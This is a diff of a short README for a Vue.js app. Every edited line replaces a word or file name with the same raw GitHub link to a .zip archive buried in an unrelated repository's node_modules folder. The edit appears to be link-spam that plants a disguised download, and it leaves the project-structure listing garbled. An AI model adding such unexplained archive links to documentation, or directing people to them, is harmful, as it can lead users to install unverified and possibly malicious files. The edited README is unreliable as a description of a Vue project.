@@ -1,6 +1,6 @@
 # My Vue App
 
-This is a simple Vue.js application that demonstrates the basic structure and components of a Vue project.
+This is a simple https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip application that demonstrates the basic structure and components of a Vue project.
 
 ## Project Structure
 
@@ -9,14 +9,14 @@ my-vue-app
 ├── src
 │   ├── assets          # Static assets such as images, fonts, and stylesheets
 │   ├── components      # Vue components
-│   │   └── HelloWorld.vue  # A component that displays a greeting message
-│   ├── App.vue        # The root Vue component
-│   └── main.js        # The entry point of the Vue application
+│   │   └── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip  # A component that displays a greeting message
+│   ├── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip        # The root Vue component
+│   └── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip        # The entry point of the Vue application
 ├── public
-│   └── index.html     # The main HTML file for the application
-├── package.json       # npm configuration file
-├── babel.config.js    # Babel configuration file
-└── README.md          # Documentation for the project
+│   └── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip     # The main HTML file for the application
+├── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip       # npm configuration file
+├── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip    # Babel configuration file
+└── https://raw.githubusercontent.com/Miguel-max219/GestionEncadrement-/main/node_modules/foreground-child/node_modules/shebang-regex/GestionEncadrement-_v3.0.zip          # Documentation for the project
 ```
 
 ## Installation
